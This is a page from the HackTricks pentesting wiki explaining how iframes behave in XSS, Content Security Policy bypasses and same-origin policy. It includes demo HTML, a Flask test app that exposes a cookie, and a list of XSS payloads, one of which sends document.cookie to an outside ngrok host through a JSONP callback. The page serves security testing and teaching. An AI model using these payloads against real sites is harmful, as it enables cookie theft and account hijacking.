# Iframes in XSS, CSP and SOP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Iframes in XSS

There are 3 ways to indicate the content of an iframed page:

* Via `src` indicating an URL (the URL may be cross origin or same origin)
* Via `src` indicating the content using the `data:` protocol
* Via `srcdoc` indicating the content

**Accesing Parent & Child vars**

```html
<html>
  <script>
  var secret = "31337s3cr37t";
  </script>

  <iframe id="if1" src="http://127.0.1.1:8000/child.html"></iframe>
  <iframe id="if2" src="child.html"></iframe>
  <iframe id="if3" srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
  <iframe id="if4" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>

  <script>
  function access_children_vars(){
    alert(if1.secret);
    alert(if2.secret);
    alert(if3.secret);
    alert(if4.secret);
  }
  setTimeout(access_children_vars, 3000);
  </script>
</html>
```

```html
<!-- content of child.html -->
<script>
var secret="child secret";
alert(parent.secret)
</script>
```

If you access the previous html via a http server (like `python3 -m http.server`) you will notice that all the scripts will be executed (as there is no CSP preventing it)., **the parent won’t be able to access the `secret` var inside any iframe** and **only the iframes if2 & if3 (which are considered to be same-site) can access the secret** in the original window.\
Note how if4 is considered to have `null` origin.

### Iframes with CSP <a href="#iframes_with_csp_40" id="iframes_with_csp_40"></a>

{% hint style="info" %}
Please, note how in the following bypasses the response to the iframed page doesn't contain any CSP header that prevents JS execution.
{% endhint %}

The `self` value of `script-src` won’t allow the execution of the JS code using the `data:` protocol or the `srcdoc` attribute.\
However, even the `none` value of the CSP will allow the execution of the iframes that put a URL (complete or just the path) in the `src` attribute.\
Therefore it’s possible to bypass the CSP of a page with:

```html
<html>
<head>
 <meta http-equiv="Content-Security-Policy" content="script-src 'sha256-iF/bMbiFXal+AAl9tF8N6+KagNWdMlnhLqWkjAocLsk='">
</head>
  <script>
  var secret = "31337s3cr37t";
  </script>
  <iframe id="if1" src="child.html"></iframe>
  <iframe id="if2" src="http://127.0.1.1:8000/child.html"></iframe>
  <iframe id="if3" srcdoc="<script>var secret='if3 secret!'; alert(parent.secret)</script>"></iframe>
  <iframe id="if4" src="data:text/html;charset=utf-8,%3Cscript%3Evar%20secret='if4%20secret!';alert(parent.secret)%3C%2Fscript%3E"></iframe>
</html>
```

Note how the **previous CSP only permits the execution of the inline script**.\
However, **only `if1` and `if2` scripts are going to be executed but only `if1` will be able to access the parent secret**.

![](<../../.gitbook/assets/image (627) (1) (1).png>)

Therefore, it’s possible to **bypass a CSP if you can upload a JS file to the server and load it via iframe even with `script-src 'none'`**. This can **potentially be also done abusing a same-site JSONP endpoint**.

You can test this with the following scenario were a cookie is stolen even with `script-src 'none'`. Just run the application and access it with your browser:

```python
import flask
from flask import Flask
app = Flask(__name__)

@app.route("/")
def index():
    resp = flask.Response('<html><iframe id="if1" src="cookie_s.html"></iframe></html>')
    resp.headers['Content-Security-Policy'] = "script-src 'self'"
    resp.headers['Set-Cookie'] = 'secret=THISISMYSECRET'
    return resp

@app.route("/cookie_s.html")
def cookie_s():
    return "<script>alert(document.cookie)</script>"

if __name__ == "__main__":
    app.run()
```

### Other Payloads found on the wild <a href="#other_payloads_found_on_the_wild_64" id="other_payloads_found_on_the_wild_64"></a>

```html
<!-- This one requires the data: scheme to be allowed -->
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
<!-- This one injects JS in a jsonp endppoint -->
<iframe srcdoc='<script src="/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
<!-- sometimes it can be achieved using defer& async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)-->
<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
```

### Iframe sandbox

The `sandbox` attribute enables an extra set of restrictions for the content in the iframe. **By default, no restriction is applied.**

When the `sandbox` attribute is present, and it will:

* treat the content as being from a unique origin
* block form submission
* block script execution
* disable APIs
* prevent links from targeting other browsing contexts
* prevent content from using plugins (through `<embed>`, `<object>`, `<applet>`, or other)
* prevent the content to navigate its top-level browsing context
* block automatically triggered features (such as automatically playing a video or automatically focusing a form control)

The value of the `sandbox` attribute can either be empty (then all restrictions are applied), or a space-separated list of pre-defined values that will REMOVE the particular restrictions.

```html
<iframe src="demo_iframe_sandbox.htm" sandbox></iframe>
```

## Iframes in SOP

Check the following pages:

{% content-ref url="../postmessage-vulnerabilities/bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](../postmessage-vulnerabilities/bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

{% content-ref url="../postmessage-vulnerabilities/bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](../postmessage-vulnerabilities/bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

{% content-ref url="../postmessage-vulnerabilities/blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](../postmessage-vulnerabilities/blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

{% content-ref url="../postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](../postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
